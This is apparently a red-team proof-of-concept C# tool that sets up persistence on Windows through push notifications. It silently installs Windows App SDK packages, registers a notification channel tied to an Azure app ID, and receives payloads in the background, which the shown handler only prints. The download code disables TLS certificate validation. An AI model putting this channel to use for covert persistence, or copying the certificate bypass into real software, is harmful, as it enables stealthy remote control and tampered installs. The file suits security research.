using Microsoft.Windows.PushNotifications;
using Microsoft.Windows.ApplicationModel.DynamicDependency;
using Windows.Management.Deployment;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO.Compression;
using Microsoft.Windows.AppLifecycle;
using WinRT;
using System.Text;
using Windows.ApplicationModel.Activation;

namespace hermes
{   
    internal class Program
    {
        static string _VERSION_ = "1.0.0";
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(SafeLibraryHandle hModule, String procname);
        [DllImport("kernel32", CharSet = CharSet.Auto, BestFitMapping = false, SetLastError = true)]
        public static extern SafeLibraryHandle LoadLibrary(string fileName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int MddBootstrapInitialize3(uint majorMinorVersion, string versionTag, PackageVersion packageVersion, Bootstrap.InitializeOptions options);
        private static MddBootstrapInitialize3 InitBootstrap;

        private static string SDK12URL = "https://aka.ms/windowsappsdk/1.2/1.2.230313.1/Microsoft.WindowsAppRuntime.Redist.1.2.zip";
        private static string SDK13URL = "https://aka.ms/windowsappsdk/1.3/1.3.230502000/Microsoft.WindowsAppRuntime.Redist.1.3.zip";

        private static Guid azureAppGuid;


        static async Task Main()
        {
            Console.WriteLine("|-----------------------------------------------|");
            Console.WriteLine("| Persistent Security Industries GmbH           |");
            Console.WriteLine($"| Persistence via push notifications PoC v{_VERSION_} |");
            Console.WriteLine("|-----------------------------------------------|\n");

            if (!await CheckDependenciesAsync())
            {
                Console.WriteLine("[+] Dependencies failed.");
                return;
            }

            if (!PushNotificationManager.IsSupported())
            {
                Console.WriteLine("[+] Push notifications are not supported.");
                return;
            }
            Console.WriteLine("[+] Push notifications are supported.");

            var activationArguments = AppInstance.GetCurrent().GetActivatedEventArgs();
            object activatedEventArgs;
            string lastArg;

            switch (activationArguments.Kind)
            {
                case ExtendedActivationKind.CommandLineLaunch:
                    activatedEventArgs = activationArguments.Data.As<ICommandLineActivatedEventArgs>();
                    lastArg = ((ICommandLineActivatedEventArgs)activatedEventArgs).Operation.Arguments.Split().Last().Replace("\"", "");
                    break;
                case ExtendedActivationKind.Launch:
                    activatedEventArgs = activationArguments.Data.As<ILaunchActivatedEventArgs>();
                    lastArg = ((ILaunchActivatedEventArgs)activatedEventArgs).Arguments.Split().Last().Replace("\"", "");                    
                    break;
                case ExtendedActivationKind.Push:
                    PushNotificationReceivedEventArgs pushArgs = activationArguments.Data.As<PushNotificationReceivedEventArgs>();
                    var deferral = pushArgs.GetDeferral();
                    var notificationPayload = Encoding.UTF8.GetString(pushArgs.Payload);
                    DoSomething(notificationPayload);
                    Console.WriteLine("Press any key to exit");
                    Console.ReadKey();
                    deferral.Complete();
                    return;
                default:
                    Console.WriteLine("[-] Invalid activation event");
                    return;
            }

            if (!Guid.TryParse(lastArg, out azureAppGuid))
            {
                Console.WriteLine("[-] Invalid Guid. Enter a valid Object Id.");
                Console.WriteLine("Usage: hermes.exe <object_id>");
                return;
            }
            Console.WriteLine($"[+] Using object (app) id: {azureAppGuid}");

            try
            {
                var manager = PushNotificationManager.Default;
                manager.Register();

                var ch = await manager.CreateChannelAsync(azureAppGuid);

                Console.WriteLine("\n" + ch.Channel.Uri);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            Console.WriteLine("Press any key to exit");
            Console.ReadKey(true);
            //MddBootstrapShutdown();
        }


        static bool Init(string bootstrapPath)
        {
            uint[] versions = { 0x00010003, 0x00010002, 0x00010001 };
            Console.WriteLine("[+] Loading bootstrap dll from: " + Path.Combine(bootstrapPath, "Microsoft.WindowsAppRuntime.Bootstrap.dll"));
            var h = LoadLibrary(Path.Combine(bootstrapPath, "Microsoft.WindowsAppRuntime.Bootstrap.dll"));

            if (h == null)
            {
                Console.WriteLine("[-] Failed to load bootstrap dll.");
                return false;
            }
            var addr = GetProcAddress(h, "MddBootstrapInitialize2");


            if (h.IsInvalid)
            {
                int hr = Marshal.GetHRForLastWin32Error();
                Marshal.ThrowExceptionForHR(hr);
                Console.WriteLine("[-] Bootstrap DLL not loaded correctly");
                return false;
            }
            else
            {
                Console.WriteLine("[+] Bootstrap DLL loaded correctly");
                if (addr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] MddBootstrapInitialize2 was not found");
                    return false;
                }
                InitBootstrap = (MddBootstrapInitialize3)Marshal.GetDelegateForFunctionPointer(addr, typeof(MddBootstrapInitialize3));
            }

            foreach (uint version in versions)
            {
                try
                {
                    Marshal.ThrowExceptionForHR(InitBootstrap(version, null, default, Bootstrap.InitializeOptions.None));
                    Console.WriteLine($"[+] Initialized SDK Version 0x{version:X}");
                    return true;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }
            }
            return false;
        }

        static async Task<bool> InstallPackageAsync(string url, bool runtime = false, bool main_ = false, bool ddl = false, bool singleton = false)
        {
            var packageUri = new Uri(url);
            var packageManager = new PackageManager();

            System.Net.WebProxy webProxy = new System.Net.WebProxy
            {
                UseDefaultCredentials = true,
                Address = HttpClient.DefaultProxy.GetProxy(packageUri)
            };
            try
            {
                var httpClientHandler = new HttpClientHandler
                {
                    Proxy = webProxy,
                    ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
                };

                using (var client = new HttpClient(httpClientHandler))
                {
                    var data = await client.GetByteArrayAsync(url);

                    using (var memoryStream = new MemoryStream(data))
                    {
                        using (var archive = new ZipArchive(memoryStream))
                        {
                            foreach (var entry in archive.Entries)
                            {
                                if (entry.FullName.StartsWith("MSIX/win10-x64", StringComparison.OrdinalIgnoreCase) && entry.FullName.EndsWith(".msix", StringComparison.OrdinalIgnoreCase))
                                {
                                    if ((runtime && entry.Name.StartsWith("Microsoft.WindowsAppRuntime")) ||
                                        (main_ && entry.Name.StartsWith("Microsoft.WindowsAppRuntime.Main")) ||
                                        (ddl && entry.Name.StartsWith("Microsoft.WindowsAppRuntime.DDLM")) ||
                                        (singleton && entry.Name.StartsWith("Microsoft.WindowsAppRuntime.Singleton")))
                                    {
                                        Console.WriteLine($"[+] Installing {entry.FullName}");
                                        var tempFilePath = Path.GetTempFileName() + ".msix";

                                        try
                                        {
                                            using (var fileStream = File.OpenWrite(tempFilePath))
                                            using (var entryStream = entry.Open())
                                            {
                                                await entryStream.CopyToAsync(fileStream);
                                            }
                                            var deploymentOperation = await packageManager.AddPackageAsync(new Uri(tempFilePath), null, DeploymentOptions.None);

                                            Console.WriteLine($"[+] Package installed: {deploymentOperation.IsRegistered}");
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine(ex.Message);
                                            File.Delete(tempFilePath);
                                            continue;
                                        }
                                        finally
                                        {
                                            File.Delete(tempFilePath);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return true;
        }


        static Windows.ApplicationModel.Package[] GetAppRuntimeVersions()
        {
            var packageManager = new PackageManager();
            string installationPath = string.Empty;
            Windows.ApplicationModel.Package[] frameworks = Array.Empty<Windows.ApplicationModel.Package>();

            foreach (var package in packageManager.FindPackagesForUser(string.Empty))
            {
                //if ((package.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.3_8wekyb3d8bbwe" || package.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.2_8wekyb3d8bbwe")
                //    && package.Id.Architecture == Windows.System.ProcessorArchitecture.X64)
                
                // Search only SDK 1.3 for now. It's more reliable.
                if (package.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.3_8wekyb3d8bbwe" && package.Id.Architecture == Windows.System.ProcessorArchitecture.X64)
                {
                    Console.WriteLine($"[+] Found {package.Id.FamilyName}");
                    frameworks = frameworks.Append(package).ToArray();
                }
            }

            return frameworks;
        }

        static async Task<bool> CheckDependenciesAsync()
        {
            bool foundDDL12 = false;
            bool foundSingleton12 = false;
            bool foundDDL13 = false;
            bool foundSingleton13 = false;
            string version = "0000";
            Windows.ApplicationModel.Package[] frameworks = GetAppRuntimeVersions();

            if (frameworks.Length == 0)
            {
                Console.WriteLine("[-] No compatible frameworks are installed. Attempting to deploy one.");
                return await InstallPackageAsync(SDK13URL, true, true, true, true);
            }
            else
            {
                var packageManager = new PackageManager();

                foreach (var package in packageManager.FindPackagesForUser(string.Empty))
                {
                    if (package.Id.FamilyName.StartsWith("Microsoft.WinAppRuntime.DDLM") && package.Id.Architecture == Windows.System.ProcessorArchitecture.X64)
                    {
                        foreach (var framework in frameworks)
                        {
                            foreach (var dependency in package.Dependencies)
                            {
                                if (dependency.Id.FamilyName == framework.Id.FamilyName)
                                {
                                    if (framework.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.3_8wekyb3d8bbwe")
                                    {
                                        foundDDL13 = true;
                                        Console.WriteLine("[+] DDL 1.3 is already installed.");
                                        continue;
                                    }
                                    if (framework.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.2_8wekyb3d8bbwe")
                                    {
                                        foundDDL12 = true;
                                        Console.WriteLine("[+] DDL 1.2 is already installed.");
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                    if (package.Id.FamilyName.StartsWith("MicrosoftCorporationII.WinAppRuntime.Singleton") && package.Id.Architecture == Windows.System.ProcessorArchitecture.X64)
                    {
                        foreach (var framework in frameworks)
                        {
                            foreach (var dependency in package.Dependencies)
                            {
                                if (dependency.Id.FamilyName == framework.Id.FamilyName)
                                {
                                    if (framework.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.3_8wekyb3d8bbwe")
                                    {
                                        foundSingleton13 = true;
                                        Console.WriteLine("[+] Singleton 1.3 is already installed.");
                                        continue;
                                    }
                                    if (framework.Id.FamilyName == "Microsoft.WindowsAppRuntime.1.2_8wekyb3d8bbwe")
                                    {
                                        foundSingleton12 = true;
                                        Console.WriteLine("[+] Singleton 1.2 is already installed.");
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                }

                if ((foundDDL12 && foundSingleton12) || (foundDDL13 && foundSingleton13))
                {
                    version = foundDDL13 && foundSingleton13 ? "1.3" : "1.2";
                    Console.WriteLine($"[+] Found compatible framework version {(foundDDL13 && foundSingleton13 ? 1.3 : 1.2)}");

                    foreach (var framework in frameworks)
                    {
                        if (framework.Id.FamilyName.Contains(version))
                        {
                            return Init(framework.InstalledPath);
                        }
                    }
                }

                foreach (var framework in frameworks)
                {
                    if (framework.Id.FamilyName.Contains("1.2"))
                    {
                        await InstallPackageAsync(SDK12URL, false, false, !foundDDL12, !foundSingleton12);
                        return Init(framework.InstalledPath);
                    }

                    if (framework.Id.FamilyName.Contains("1.3"))
                    {
                        await InstallPackageAsync(SDK13URL, false, false, !foundDDL13, !foundSingleton13);
                        return Init(framework.InstalledPath);
                    }
                }
            }

            return false;
        }


        static void DoSomething(string payload)
        {
            Console.WriteLine($"[+] Received push notification content in the background: \n\n{payload}\n");
            return;
        }        
    }

    sealed class SafeLibraryHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        [DllImport("kernel32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);
        private SafeLibraryHandle() : base(true) { }

        protected override bool ReleaseHandle()
        {
            return FreeLibrary(handle);
        }
    }
}